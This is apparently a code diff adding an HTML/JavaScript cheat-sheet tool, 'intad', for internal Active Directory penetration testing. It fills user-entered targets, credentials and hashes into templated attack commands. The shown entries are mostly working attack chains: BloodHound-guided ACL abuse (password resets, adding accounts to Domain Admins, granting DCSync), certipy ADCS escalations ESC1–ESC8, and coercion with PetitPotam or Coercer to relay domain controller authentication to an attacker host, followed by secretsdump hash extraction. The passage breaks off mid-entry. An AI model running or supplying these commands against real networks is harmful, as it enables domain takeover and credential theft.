@@ -1,0 +1,939 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>intad — Internal AD Pentest TUI 2026</title>
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+:root{
+  --bg:#0a0a0a;--bg2:#111111;--bg3:#161616;--bg4:#1c1c1c;
+  --border:#242424;--border2:#2a2a2a;
+  --text:#c8c8c8;--text2:#888;--text3:#555;
+  --green:#00af87;--blue:#5fafd7;--yellow:#ffaf00;--red:#ff5f87;
+  --purple:#af87ff;--orange:#ff8700;--cyan:#00d7d7;--white:#eeeeee;
+  --font:'Consolas','Fira Code',monospace;
+}
+html,body{height:100%;overflow:hidden}
+body{background:var(--bg);color:var(--text);font-family:var(--font);font-size:12px;display:flex;flex-direction:column}
+
+.topbar{background:#0a0a0a;border-bottom:1px solid #242424;padding:.3rem .8rem;display:flex;align-items:center;gap:.7rem;flex-shrink:0}
+.logo{color:#ff2d2d;font-weight:700;font-size:.95rem;letter-spacing:.05em}
+.logo em{color:var(--yellow);font-style:normal}
+.topbar-pill{font-size:.62rem;color:var(--text3);border:1px solid #333;padding:.08rem .35rem;border-radius:2px}
+.topbar-right{margin-left:auto;display:flex;gap:.4rem}
+.tb-btn{background:#222;border:1px solid #444;color:var(--text2);padding:.18rem .6rem;border-radius:2px;cursor:pointer;font-family:var(--font);font-size:.68rem;transition:.1s}
+.tb-btn:hover{border-color:var(--green);color:var(--green)}
+.tb-btn.accent{border-color:var(--purple);color:var(--purple)}
+
+.globals{background:#0f0f0f;border-bottom:1px solid #242424;padding:.3rem .7rem;display:flex;flex-direction:column;gap:.25rem;flex-shrink:0}
+.globals-row{display:flex;flex-wrap:wrap;gap:.4rem;align-items:center}
+.gfield{display:flex;align-items:center;gap:.3rem;flex-shrink:0}
+.glabel{color:var(--text3);font-size:.65rem;white-space:nowrap;min-width:60px;text-align:right}
+.ginput{background:#111;border:1px solid #333;color:var(--cyan);padding:.18rem .45rem;font-family:var(--font);font-size:.72rem;width:130px;outline:none;border-radius:1px;transition:.12s}
+.ginput:focus{border-color:var(--green);color:var(--white)}
+.ginput.wide{width:190px}
+.ginput.med{width:100px}
+.ginput.sm{width:72px}
+.gsep{color:#333;font-size:.8rem;margin:0 .1rem}
+
+.app{display:flex;flex:1;overflow:hidden;min-height:0}
+
+.sidebar{width:200px;min-width:160px;background:#0e0e0e;border-right:1px solid #242424;display:flex;flex-direction:column;overflow:hidden;flex-shrink:0}
+.sb-search{padding:.3rem .5rem;border-bottom:1px solid #333;display:flex;align-items:center;gap:.3rem}
+.sb-search input{flex:1;background:transparent;border:none;color:var(--white);font-family:var(--font);font-size:.75rem;outline:none}
+.sb-search input::placeholder{color:var(--text3)}
+.cat-list{flex:1;overflow-y:auto}
+.cat-list::-webkit-scrollbar{width:2px}
+.cat-list::-webkit-scrollbar-thumb{background:#333}
+.cat-item{padding:.32rem .65rem;cursor:pointer;display:flex;align-items:center;gap:.45rem;transition:.08s;border-left:2px solid transparent}
+.cat-item:hover{background:#272727}
+.cat-item.active{background:#2d2d2d;border-left-color:var(--green);color:var(--white)}
+.cat-icon{font-size:.82rem;width:16px;text-align:center;flex-shrink:0}
+.cat-name{font-size:.72rem;flex:1}
+.cat-count{font-size:.6rem;color:var(--text3);background:#222;padding:.02rem .3rem;border-radius:8px}
+.cat-item.active .cat-count{color:var(--text2)}
+
+.cmdpanel{width:240px;min-width:200px;border-right:1px solid #333;display:flex;flex-direction:column;overflow:hidden;flex-shrink:0}
+.cmdpanel-hdr{padding:.28rem .6rem;background:#1a1a1a;border-bottom:1px solid #333;font-size:.63rem;color:var(--text3);display:flex;gap:.4rem;align-items:center;flex-shrink:0}
+.cmdpanel-hdr .cat-lbl{color:var(--yellow)}
+.cmdpanel-hdr .cnt{color:var(--green);font-weight:700}
+.cmd-list{flex:1;overflow-y:auto}
+.cmd-list::-webkit-scrollbar{width:2px}
+.cmd-list::-webkit-scrollbar-thumb{background:#333}
+.cmd-item{padding:.38rem .6rem;cursor:pointer;border-bottom:1px solid #222;transition:.08s}
+.cmd-item:hover{background:#272727}
+.cmd-item.active{background:#303030}
+.cmd-name{font-size:.77rem;font-weight:700;color:var(--blue);margin-bottom:.12rem}
+.cmd-desc{font-size:.65rem;color:var(--text3);overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
+.cmd-tags{display:flex;flex-wrap:wrap;gap:.15rem;margin-top:.18rem}
+.tag{padding:.02rem .3rem;border-radius:1px;font-size:.58rem;font-weight:700;letter-spacing:.03em}
+.tag.enum{background:rgba(95,175,215,.15);color:var(--blue)}
+.tag.exploit{background:rgba(255,95,135,.15);color:var(--red)}
+.tag.adcs{background:rgba(175,135,255,.15);color:var(--purple)}
+.tag.kerberos{background:rgba(255,175,0,.15);color:var(--yellow)}
+.tag.lateral{background:rgba(255,135,0,.15);color:var(--orange)}
+.tag.privesc{background:rgba(255,95,135,.15);color:var(--red)}
+.tag.recon{background:rgba(0,215,215,.15);color:var(--cyan)}
+.tag.shell{background:rgba(0,175,135,.15);color:var(--green)}
+.tag.creds{background:rgba(255,95,135,.15);color:var(--red)}
+.tag.acl{background:rgba(175,135,255,.18);color:var(--purple)}
+.tag.dpapi{background:rgba(255,135,0,.18);color:var(--orange)}
+.tag.cloud{background:rgba(0,215,215,.18);color:var(--cyan)}
+.tag.default{background:#222;color:var(--text2)}
+
+.detail{flex:1;display:flex;flex-direction:column;overflow:hidden;min-width:0}
+.detail-hdr{padding:.38rem .8rem;background:#1a1a1a;border-bottom:1px solid #333;flex-shrink:0}
+.detail-title{font-size:.88rem;font-weight:700;color:var(--white);margin-bottom:.1rem}
+.detail-desc{font-size:.68rem;color:var(--text2);line-height:1.4}
+.detail-tags{display:flex;flex-wrap:wrap;gap:.2rem;margin-top:.28rem}
+.detail-body{flex:1;overflow-y:auto;padding:.5rem .8rem}
+.detail-body::-webkit-scrollbar{width:3px}
+.detail-body::-webkit-scrollbar-thumb{background:#333}
+.variation{background:#222;border:1px solid #333;margin-bottom:.55rem;border-radius:2px;overflow:hidden}
+.var-hdr{padding:.28rem .6rem;background:#282828;display:flex;align-items:center;gap:.4rem;font-size:.65rem;border-bottom:1px solid #333}
+.var-name{color:var(--yellow);font-weight:700;flex:1}
+.var-body{padding:.4rem .6rem}
+.cmd-box{background:#111;border:1px solid #2a2a2a;padding:.4rem .6rem;font-size:.73rem;color:#a8ff78;line-height:1.55;overflow-x:auto;white-space:pre;margin-bottom:.3rem;position:relative;border-radius:1px}
+.cmd-box .param{color:var(--yellow);font-weight:700}
+.var-actions{display:flex;gap:.28rem;flex-wrap:wrap}
+.vbtn{background:#2a2a2a;border:1px solid #3a3a3a;color:var(--text2);padding:.18rem .5rem;border-radius:2px;cursor:pointer;font-size:.65rem;font-family:var(--font);transition:.1s}
+.vbtn:hover{border-color:var(--green);color:var(--green)}
+.vbtn.primary{border-color:var(--green);color:var(--green)}
+.vbtn.primary:hover,.vbtn.ok{background:var(--green);color:#000;border-color:var(--green)}
+
+.empty{flex:1;display:flex;flex-direction:column;align-items:center;justify-content:center;color:var(--text3);gap:.4rem;font-size:.78rem}
+.empty .ic{font-size:2rem;opacity:.3}
+
+.footer{background:#111;border-top:1px solid #333;padding:.22rem .8rem;display:flex;gap:1.2rem;flex-shrink:0;flex-wrap:wrap;align-items:center}
+.fhint{font-size:.6rem;color:var(--text3);display:flex;align-items:center;gap:.25rem}
+.kbd{background:#222;border:1px solid #3a3a3a;color:var(--text3);padding:.02rem .28rem;border-radius:1px;font-size:.6rem}
+.fright{margin-left:auto;color:var(--green);font-size:.6rem}
+
+.moverlay{display:none;position:fixed;inset:0;background:rgba(0,0,0,.75);z-index:100;align-items:center;justify-content:center}
+.moverlay.open{display:flex}
+.modal{background:#222;border:1px solid #444;border-radius:3px;padding:1rem;width:380px;max-width:95vw}
+.modal h3{color:var(--green);font-size:.85rem;margin-bottom:.7rem;border-bottom:1px solid #333;padding-bottom:.4rem}
+.mrow{margin-bottom:.5rem}
+.mrow label{display:block;font-size:.65rem;color:var(--text2);margin-bottom:.18rem}
+.minput{width:100%;background:#1a1a1a;border:1px solid #3a3a3a;color:var(--white);padding:.3rem .5rem;font-family:var(--font);font-size:.75rem;outline:none;border-radius:1px}
+.minput:focus{border-color:var(--green)}
+.mactions{display:flex;gap:.4rem;justify-content:flex-end;margin-top:.7rem}
+.mbtn{background:#2a2a2a;border:1px solid #444;color:var(--text);padding:.28rem .7rem;border-radius:2px;cursor:pointer;font-family:var(--font);font-size:.72rem;transition:.1s}
+.mbtn:hover{border-color:var(--text)}
+.mbtn.ok{border-color:var(--green);color:var(--green)}
+.mbtn.ok:hover{background:var(--green);color:#000}
+
+.toast{position:fixed;bottom:1.8rem;right:1.2rem;background:var(--green);color:#000;padding:.4rem .9rem;border-radius:2px;font-size:.72rem;font-weight:700;z-index:200;opacity:0;transform:translateY(.4rem);transition:.18s;pointer-events:none}
+.toast.show{opacity:1;transform:none}
+
+::-webkit-scrollbar{width:3px;height:3px}
+::-webkit-scrollbar-track{background:transparent}
+::-webkit-scrollbar-thumb{background:#333}
+</style>
+</head>
+<body>
+
+<!-- TOP BAR -->
+<div class="topbar">
+  <div class="logo">int<em>ad</em></div>
+  <div class="topbar-pill">v2026.1</div>
+  <div class="topbar-pill">internal network pentest</div>
+  <div class="topbar-right">
+    <button class="tb-btn" onclick="openModal('scan')">⚡ Scan</button>
+    <button class="tb-btn accent" onclick="openModal('custom')">＋ Add Cheat</button>
+    <button class="tb-btn" onclick="clearGlobals()">✕ Clear Globals</button>
+  </div>
+</div>
+
+<!-- GLOBALS -->
+<div class="globals">
+  <div class="globals-row">
+    <div class="gfield"><span class="glabel">lhost</span><input class="ginput med" id="g-lhost" placeholder="10.10.14.1" oninput="regen()"></div>
+    <div class="gsep">—</div>
+    <div class="gfield"><span class="glabel">lport</span><input class="ginput sm" id="g-lport" placeholder="4444" oninput="regen()"></div>
+    <div class="gsep">—</div>
+    <div class="gfield"><span class="glabel">lwport</span><input class="ginput sm" id="g-lwport" placeholder="8000" oninput="regen()"></div>
+    <div class="gsep">—</div>
+    <div class="gfield"><span class="glabel">ip</span><input class="ginput med" id="g-ip" placeholder="10.10.10.1" oninput="regen()"></div>
+    <div class="gsep">—</div>
+    <div class="gfield"><span class="glabel">hostname</span><input class="ginput med" id="g-hostname" placeholder="DC01" oninput="regen()"></div>
+    <div class="gsep">—</div>
+    <div class="gfield"><span class="glabel">domain</span><input class="ginput med" id="g-domain" placeholder="corp.local" oninput="regen()"></div>
+  </div>
+  <div class="globals-row">
+    <div class="gfield"><span class="glabel">fqdn</span><input class="ginput med" id="g-fqdn" placeholder="DC01.corp.local" oninput="regen()"></div>
+    <div class="gsep">—</div>
+    <div class="gfield"><span class="glabel">dc_ip</span><input class="ginput med" id="g-dc-ip" placeholder="10.10.10.1" oninput="regen()"></div>
+    <div class="gsep">—</div>
+    <div class="gfield"><span class="glabel">dc_fqdn</span><input class="ginput med" id="g-dc-fqdn" placeholder="DC01.corp.local" oninput="regen()"></div>
+    <div class="gsep">—</div>
+    <div class="gfield"><span class="glabel">domain_sid</span><input class="ginput wide" id="g-sid" placeholder="S-1-5-21-..." oninput="regen()"></div>
+    <div class="gsep">—</div>
+    <div class="gfield"><span class="glabel">krb5ccname</span><input class="ginput wide" id="g-krb5" placeholder="/root/..." oninput="regen()"></div>
+    <div class="gsep">—</div>
+    <div class="gfield"><span class="glabel">prefix</span><input class="ginput med" id="g-prefix" placeholder="intad__" oninput="regen()"></div>
+  </div>
+  <div class="globals-row">
+    <div class="gfield"><span class="glabel">user</span><input class="ginput med" id="g-user" placeholder="administrator" oninput="regen()"></div>
+    <div class="gsep">—</div>
+    <div class="gfield"><span class="glabel">pass</span><input class="ginput med" id="g-pass" placeholder="Password123!" oninput="regen()"></div>
+    <div class="gsep">—</div>
+    <div class="gfield"><span class="glabel">hash (NT)</span><input class="ginput wide" id="g-hash" placeholder="aad3b435b51404eeaad3b435..." oninput="regen()"></div>
+    <div class="gsep">—</div>
+    <div class="gfield"><span class="glabel">ca_name</span><input class="ginput med" id="g-ca" placeholder="corp-DC01-CA" oninput="regen()"></div>
+    <div class="gsep">—</div>
+    <div class="gfield"><span class="glabel">target_user</span><input class="ginput med" id="g-tuser" placeholder="Administrator" oninput="regen()"></div>
+    <div class="gsep">—</div>
+    <div class="gfield"><span class="glabel">template</span><input class="ginput med" id="g-tmpl" placeholder="User" oninput="regen()"></div>
+  </div>
+</div>
+
+<!-- APP -->
+<div class="app">
+  <aside class="sidebar">
+    <div class="sb-search">
+      <span style="color:var(--text3);font-size:.8rem">🔍</span>
+      <input id="search" placeholder="Search…" oninput="onSearch()" autocomplete="off" spellcheck="false">
+    </div>
+    <div class="cat-list" id="cat-list"></div>
+  </aside>
+
+  <div class="cmdpanel">
+    <div class="cmdpanel-hdr">
+      <span class="cat-lbl" id="hdr-cat">All</span>
+      <span style="color:var(--text3)">›</span>
+      <span class="cnt" id="hdr-cnt">0</span>
+      <span style="color:var(--text3)">cheats</span>
+    </div>
+    <div class="cmd-list" id="cmd-list"></div>
+  </div>
+
+  <div class="detail">
+    <div class="empty" id="empty-state">
+      <div class="ic">🏢</div>
+      <div>Select a cheat to view commands</div>
+      <div style="font-size:.65rem;color:var(--text3)">Fill globals above • ↑↓ navigate • Enter copy</div>
+    </div>
+    <div id="detail-wrap" style="display:none;flex-direction:column;height:100%">
+      <div class="detail-hdr">
+        <div class="detail-title" id="d-title"></div>
+        <div class="detail-desc" id="d-desc"></div>
+        <div class="detail-tags" id="d-tags"></div>
+      </div>
+      <div class="detail-body" id="d-body"></div>
+    </div>
+  </div>
+</div>
+
+<!-- FOOTER -->
+<div class="footer">
+  <div class="fhint"><span class="kbd">↑↓</span>navigate</div>
+  <div class="fhint"><span class="kbd">Enter</span>copy</div>
+  <div class="fhint"><span class="kbd">/</span>search</div>
+  <div class="fhint"><span class="kbd">Tab</span>next var</div>
+  <div class="fhint"><span class="kbd">Esc</span>clear</div>
+  <div class="fright">intad — internal pentest toolkit 2026</div>
+</div>
+
+<!-- Scan Modal -->
+<div class="moverlay" id="modal-scan">
+  <div class="modal">
+    <h3>⚡ Auto-populate from target</h3>
+    <div class="mrow"><label>Target IP / hostname</label><input class="minput" id="scan-ip" placeholder="10.10.10.1"></div>
+    <div class="mrow"><label>Domain (e.g. corp.local)</label><input class="minput" id="scan-dom" placeholder="corp.local"></div>
+    <div class="mrow"><label>Hostname (e.g. DC01)</label><input class="minput" id="scan-host" placeholder="DC01"></div>
+    <div class="mrow"><label>Your LHOST</label><input class="minput" id="scan-lhost" placeholder="10.10.14.1"></div>
+    <div class="mactions">
+      <button class="mbtn" onclick="closeModal('modal-scan')">Cancel</button>
+      <button class="mbtn ok" onclick="doScan()">Populate</button>
+    </div>
+  </div>
+</div>
+
+<!-- Custom Modal -->
+<div class="moverlay" id="modal-custom">
+  <div class="modal">
+    <h3>＋ Add Custom Cheat</h3>
+    <div class="mrow"><label>Name</label><input class="minput" id="cc-name" placeholder="My Command"></div>
+    <div class="mrow"><label>Category</label><input class="minput" id="cc-cat" placeholder="Custom"></div>
+    <div class="mrow"><label>Description</label><input class="minput" id="cc-desc" placeholder="What does it do?"></div>
+    <div class="mrow"><label>Command (use {IP},{DC_IP},{DC_FQDN},{DOMAIN},{FQDN},{USER},{PASS},{HASH},{LHOST},{LPORT},{CA_NAME},{TARGET_USER},{TEMPLATE})</label>
+      <input class="minput" id="cc-cmd" placeholder="nxc smb {IP} -u '{USER}' -p '{PASS}'"></div>
+    <div class="mactions">
+      <button class="mbtn" onclick="closeModal('modal-custom')">Cancel</button>
+      <button class="mbtn ok" onclick="addCustom()">Add</button>
+    </div>
+  </div>
+</div>
+
+<div class="toast" id="toast"></div>
+
+<script>
+const G = () => ({
+  IP:          v('g-ip')       || '{IP}',
+  LHOST:       v('g-lhost')    || '{LHOST}',
+  LPORT:       v('g-lport')    || '{LPORT}',
+  LWPORT:      v('g-lwport')   || '{LWPORT}',
+  HOSTNAME:    v('g-hostname') || '{HOSTNAME}',
+  DOMAIN:      v('g-domain')   || '{DOMAIN}',
+  FQDN:        v('g-fqdn')     || '{FQDN}',
+  DC_IP:       v('g-dc-ip')    || '{DC_IP}',
+  DC_FQDN:     v('g-dc-fqdn')  || '{DC_FQDN}',
+  DOMAIN_SID:  v('g-sid')      || '{DOMAIN_SID}',
+  KRB5CCNAME:  v('g-krb5')     || '{KRB5CCNAME}',
+  PREFIX:      v('g-prefix')   || '{PREFIX}',
+  USER:        v('g-user')     || '{USER}',
+  PASS:        v('g-pass')     || '{PASS}',
+  HASH:        v('g-hash')     || '{HASH}',
+  CA_NAME:     v('g-ca')       || '{CA_NAME}',
+  TARGET_USER: v('g-tuser')    || '{TARGET_USER}',
+  TEMPLATE:    v('g-tmpl')     || '{TEMPLATE}',
+});
+const v = id => document.getElementById(id)?.value?.trim();
+
+function interp(cmd) {
+  const g = G();
+  return cmd.replace(/\{(\w+)\}/g, (m,k) => g[k] !== undefined ? g[k] : m);
+}
+
+let DB = [
+
+// ══ AD ALL-IN-ONE ══
+{id:1,cat:'AD All in One',icon:'🎯',name:'Full Recon Chain',desc:'BloodHound CE + NXC + Certipy one-shot',tags:['recon','enum'],
+variations:[
+  {name:'BH CE + NXC full recon',cmd:`bloodhound-ce-python --zip -c All -d {DOMAIN} -dc {DC_FQDN} -ns {DC_IP} -u '{USER}' -p '{PASS}' && nxc smb {IP} -u '{USER}' -p '{PASS}' --shares --users --groups && certipy find -u '{USER}@{DOMAIN}' -p '{PASS}' -dc-ip {DC_IP} -vulnerable -stdout`},
+  {name:'Kerberos auth full chain',cmd:`impacket-getTGT '{DOMAIN}/{USER}:{PASS}' -dc-ip {DC_IP} && export KRB5CCNAME=$(pwd)/'{USER}'.ccache && bloodhound-ce-python --zip -c All -d {DOMAIN} -dc {DC_FQDN} -ns {DC_IP} -u '{USER}' -k -no-pass`},
+  {name:'RustHound + NXC (fast)',cmd:`rusthound-ce -d {DOMAIN} -u '{USER}@{DOMAIN}' -p '{PASS}' -i {DC_IP} -z && nxc smb {IP} -u '{USER}' -p '{PASS}' --users --groups --shares`},
+  {name:'ldeep full dump',cmd:`ldeep ldap -u '{USER}' -p '{PASS}' -d {DOMAIN} -s ldap://{DC_IP} all -o ldeep_dump/`},
+]},
+
+// ══ BLOODHOUND ══
+{id:10,cat:'BloodHound',icon:'🩸',name:'BloodHound Collection',desc:'Collect AD data for BloodHound CE',tags:['enum','recon'],
+variations:[
+  {name:'bloodhound-ce-python (pass)',cmd:`bloodhound-ce-python --zip -c All -d {DOMAIN} -dc {DC_FQDN} -ns {DC_IP} -u '{USER}' -p '{PASS}'`},
+  {name:'bloodhound-ce-python (hash)',cmd:`bloodhound-ce-python --zip -c All -d {DOMAIN} -dc {DC_FQDN} -ns {DC_IP} -u '{USER}' --hashes :{HASH}`},
+  {name:'bloodhound-ce (kerberos)',cmd:`bloodhound-ce-python --zip -c All -d {DOMAIN} -dc {DC_FQDN} -ns {DC_IP} -u '{USER}' -k -no-pass`},
+  {name:'RustHound CE (fast, Rust)',cmd:`rusthound-ce -d {DOMAIN} -u '{USER}@{DOMAIN}' -p '{PASS}' -i {DC_IP} --zip`},
+  {name:'RustHound CE (kerberos)',cmd:`rusthound-ce -d {DOMAIN} -u '{USER}@{DOMAIN}' -k -i {DC_IP} --zip`},
+  {name:'SharpHound v2 (Windows)',cmd:`.\SharpHound.exe --CollectionMethods All --Domain {DOMAIN} --DomainController {DC_FQDN} --ZipFileName bh.zip`},
+  {name:'AzureHound (Entra ID hybrid)',cmd:`azurehound list -u '{USER}@{DOMAIN}' -p '{PASS}' -t https://login.microsoftonline.com -o azurehound.json`},
+]},
+{id:11,cat:'BloodHound',icon:'🩸',name:'BloodHound ACL Abuse',desc:'Exploit BloodHound-identified ACL paths',tags:['acl','exploit'],
+variations:[
+  {name:'GenericAll → reset pass',cmd:`net rpc password '{TARGET_USER}' 'NewPass123!' -U '{DOMAIN}/{USER}%{PASS}' -S {DC_IP}`},
+  {name:'GenericAll → add to group',cmd:`bloodyAD --host {DC_IP} -d {DOMAIN} -u '{USER}' -p '{PASS}' add groupMember 'Domain Admins' '{TARGET_USER}'`},
+  {name:'GenericWrite → set SPN (Kerberoast)',cmd:`bloodyAD --host {DC_IP} -d {DOMAIN} -u '{USER}' -p '{PASS}' set object '{TARGET_USER}' servicePrincipalName -v 'fake/fake'`},
+  {name:'WriteOwner → take ownership',cmd:`bloodyAD --host {DC_IP} -d {DOMAIN} -u '{USER}' -p '{PASS}' set owner '{TARGET_USER}' '{USER}'`},
+  {name:'WriteDACL → grant DCSync',cmd:`bloodyAD --host {DC_IP} -d {DOMAIN} -u '{USER}' -p '{PASS}' add dcsync '{USER}'`},
+  {name:'ForceChangePassword',cmd:`bloodyAD --host {DC_IP} -d {DOMAIN} -u '{USER}' -p '{PASS}' set password '{TARGET_USER}' 'NewPass123!'`},
+  {name:'AddMember',cmd:`bloodyAD --host {DC_IP} -d {DOMAIN} -u '{USER}' -p '{PASS}' add groupMember 'Remote Management Users' '{USER}'`},
+  {name:'AllowedToDelegate → S4U2Proxy',cmd:`impacket-getST -spn 'cifs/{DC_FQDN}' -impersonate {TARGET_USER} '{DOMAIN}/{USER}:{PASS}' -dc-ip {DC_IP}`},
+  {name:'Shadow Credentials (pywhisker)',cmd:`pywhisker -d {DOMAIN} -u '{USER}' -p '{PASS}' --dc-ip {DC_IP} --target '{TARGET_USER}' --action add`},
+]},
+
+// ══ BLOODYAD ══
+{id:20,cat:'bloodyAD',icon:'🦠',name:'bloodyAD User Ops',desc:'Manipulate AD objects via bloodyAD',tags:['acl','enum'],
+variations:[
+  {name:'Get writable objects',cmd:`bloodyAD --host {DC_IP} -d {DOMAIN} -u '{USER}' -p '{PASS}' get writable`},
+  {name:'Add new user',cmd:`bloodyAD --host {DC_IP} -d {DOMAIN} -u '{USER}' -p '{PASS}' add user '{PREFIX}user' 'NewPass123!'`},
+  {name:'Set password',cmd:`bloodyAD --host {DC_IP} -d {DOMAIN} -u '{USER}' -p '{PASS}' set password '{TARGET_USER}' 'NewPass123!'`},
+  {name:'Add computer',cmd:`bloodyAD --host {DC_IP} -d {DOMAIN} -u '{USER}' -p '{PASS}' add computer '{PREFIX}COMP' 'CompPass123!'`},
+  {name:'Set owner',cmd:`bloodyAD --host {DC_IP} -d {DOMAIN} -u '{USER}' -p '{PASS}' set owner '{TARGET_USER}' '{USER}'`},
+  {name:'Add genericAll',cmd:`bloodyAD --host {DC_IP} -d {DOMAIN} -u '{USER}' -p '{PASS}' add genericAll '{TARGET_USER}' '{USER}'`},
+  {name:'Add groupMember',cmd:`bloodyAD --host {DC_IP} -d {DOMAIN} -u '{USER}' -p '{PASS}' add groupMember 'Domain Admins' '{USER}'`},
+  {name:'Set ASREPROAST',cmd:`bloodyAD --host {DC_IP} -d {DOMAIN} -u '{USER}' -p '{PASS}' set object '{TARGET_USER}' userAccountControl -f DONT_REQ_PREAUTH`},
+  {name:'Set msDS-AllowedToActOnBehalfOf (RBCD)',cmd:`bloodyAD --host {DC_IP} -d {DOMAIN} -u '{USER}' -p '{PASS}' set object '{HOSTNAME}$' msDS-AllowedToActOnBehalfOfOtherIdentity -v '{PREFIX}COMP$'`},
+  {name:'Enable disabled account',cmd:`bloodyAD --host {DC_IP} -d {DOMAIN} -u '{USER}' -p '{PASS}' remove object '{TARGET_USER}' userAccountControl -f ACCOUNTDISABLE`},
+  {name:'Add dcsync rights',cmd:`bloodyAD --host {DC_IP} -d {DOMAIN} -u '{USER}' -p '{PASS}' add dcsync '{USER}'`},
+  {name:'Add DNS record',cmd:`bloodyAD --host {DC_IP} -d {DOMAIN} -u '{USER}' -p '{PASS}' add dnsRecord '{PREFIX}fake' {LHOST}`},
+]},
+
+// ══ CERTIPY ══
+{id:30,cat:'Certipy / ADCS',icon:'📜',name:'Certipy Enumeration',desc:'Enumerate ADCS templates and CAs',tags:['adcs','enum'],
+variations:[
+  {name:'Find all (pass)',cmd:`certipy find -u '{USER}@{DOMAIN}' -p '{PASS}' -dc-ip {DC_IP} -stdout`},
+  {name:'Find vulnerable only',cmd:`certipy find -u '{USER}@{DOMAIN}' -p '{PASS}' -dc-ip {DC_IP} -vulnerable -stdout`},
+  {name:'Find + BH output',cmd:`certipy find -u '{USER}@{DOMAIN}' -p '{PASS}' -dc-ip {DC_IP}`},
+  {name:'Find (kerberos)',cmd:`certipy find -u '{USER}@{DOMAIN}' -k -no-pass -dc-ip {DC_IP} -target {DC_FQDN}`},
+  {name:'Find (hash)',cmd:`certipy find -u '{USER}@{DOMAIN}' -hashes :{HASH} -dc-ip {DC_IP} -vulnerable`},
+  {name:'Enum CA templates',cmd:`certipy ca -u '{USER}@{DOMAIN}' -p '{PASS}' -dc-ip {DC_IP} -ca '{CA_NAME}' -list-templates`},
+  {name:'NXC ADCS enum',cmd:`nxc ldap {DC_IP} -u '{USER}' -p '{PASS}' -M adcs`},
+]},
+{id:31,cat:'Certipy / ADCS',icon:'📜',name:'ESC1 — SAN Abuse',desc:'Request cert with arbitrary UPN / SAN',tags:['adcs','exploit'],
+variations:[
+  {name:'ESC1 request (pass)',cmd:`certipy req -u '{USER}@{DOMAIN}' -p '{PASS}' -dc-ip {DC_IP} -target {DC_FQDN} -ca '{CA_NAME}' -template '{TEMPLATE}' -upn '{TARGET_USER}@{DOMAIN}'`},
+  {name:'ESC1 request (hash)',cmd:`certipy req -u '{USER}@{DOMAIN}' -hashes :{HASH} -dc-ip {DC_IP} -target {DC_FQDN} -ca '{CA_NAME}' -template '{TEMPLATE}' -upn '{TARGET_USER}@{DOMAIN}'`},
+  {name:'Auth with cert → NTLM hash',cmd:`certipy auth -pfx '{TARGET_USER}.pfx' -dc-ip {DC_IP} -domain {DOMAIN}`},
+]},
+{id:32,cat:'Certipy / ADCS',icon:'📜',name:'ESC3 — Enrollment Agent',desc:'Enrollment agent template abuse (OID)',tags:['adcs','exploit'],
+variations:[
+  {name:'Step 1: Get enrollment agent cert',cmd:`certipy req -u '{USER}@{DOMAIN}' -p '{PASS}' -dc-ip {DC_IP} -target {DC_FQDN} -ca '{CA_NAME}' -template 'EnrollmentAgent'`},
+  {name:'Step 2: Request on behalf of',cmd:`certipy req -u '{USER}@{DOMAIN}' -p '{PASS}' -dc-ip {DC_IP} -target {DC_FQDN} -ca '{CA_NAME}' -template 'User' -on-behalf-of '{DOMAIN}\\{TARGET_USER}' -pfx '{USER}.pfx'`},
+  {name:'Auth with cert',cmd:`certipy auth -pfx '{TARGET_USER}.pfx' -dc-ip {DC_IP} -domain {DOMAIN}`},
+]},
+{id:33,cat:'Certipy / ADCS',icon:'📜',name:'ESC4 — Template Write',desc:'Template write privilege abuse',tags:['adcs','exploit'],
+variations:[
+  {name:'ESC4 modify template',cmd:`certipy template -u '{USER}@{DOMAIN}' -p '{PASS}' -dc-ip {DC_IP} -template '{TEMPLATE}' -save-old`},
+  {name:'ESC4 request after modify',cmd:`certipy req -u '{USER}@{DOMAIN}' -p '{PASS}' -dc-ip {DC_IP} -ca '{CA_NAME}' -template '{TEMPLATE}' -upn '{TARGET_USER}@{DOMAIN}'`},
+  {name:'Restore template',cmd:`certipy template -u '{USER}@{DOMAIN}' -p '{PASS}' -dc-ip {DC_IP} -template '{TEMPLATE}' -configuration '{TEMPLATE}.json'`},
+]},
+{id:34,cat:'Certipy / ADCS',icon:'📜',name:'ESC7 — CA Officer Abuse',desc:'CA officer/manager rights escalation',tags:['adcs','exploit'],
+variations:[
+  {name:'Add officer',cmd:`certipy ca -u '{USER}@{DOMAIN}' -p '{PASS}' -dc-ip {DC_IP} -ca '{CA_NAME}' -add-officer '{USER}'`},
+  {name:'Enable SubCA template',cmd:`certipy ca -u '{USER}@{DOMAIN}' -p '{PASS}' -dc-ip {DC_IP} -ca '{CA_NAME}' -enable-template SubCA`},
+  {name:'Request SubCA cert',cmd:`certipy req -u '{USER}@{DOMAIN}' -p '{PASS}' -dc-ip {DC_IP} -ca '{CA_NAME}' -template SubCA -upn '{TARGET_USER}@{DOMAIN}'`},
+  {name:'Issue failed request',cmd:`certipy ca -u '{USER}@{DOMAIN}' -p '{PASS}' -dc-ip {DC_IP} -ca '{CA_NAME}' -issue-request <request_id>`},
+  {name:'Retrieve issued cert',cmd:`certipy req -u '{USER}@{DOMAIN}' -p '{PASS}' -dc-ip {DC_IP} -ca '{CA_NAME}' -retrieve <request_id>`},
+]},
+{id:35,cat:'Certipy / ADCS',icon:'📜',name:'ESC8 — NTLM Relay to HTTP',desc:'Relay NTLM to ADCS HTTP enrollment',tags:['adcs','exploit'],
+variations:[
+  {name:'Step 1: Start certipy relay',cmd:`certipy relay -ca {IP} -template DomainController`},
+  {name:'Step 2: Coerce auth (PetitPotam)',cmd:`python3 PetitPotam.py -u '{USER}' -p '{PASS}' -d {DOMAIN} {LHOST} {DC_IP}`},
+  {name:'Step 2: Coerce (Coercer)',cmd:`coercer coerce -l {LHOST} -t {DC_IP} -u '{USER}' -p '{PASS}' -d {DOMAIN}`},
+  {name:'Auth with DC cert',cmd:`certipy auth -pfx '{HOSTNAME}.pfx' -dc-ip {DC_IP} -domain {DOMAIN}`},
+  {name:'DCSync with machine hash',cmd:`impacket-secretsdump '{HOSTNAME}$@{DC_IP}' -hashes :{HASH} -just-dc-ntlm`},
+]},
+{id:36,cat:'Certipy / ADCS',icon:'📜',name:'ESC9 — No Security Extension',desc:'Abuse certs without szOID_NTDS_CA_SECURITY_EXT',tags:['adcs','exploit'],
+variations:[
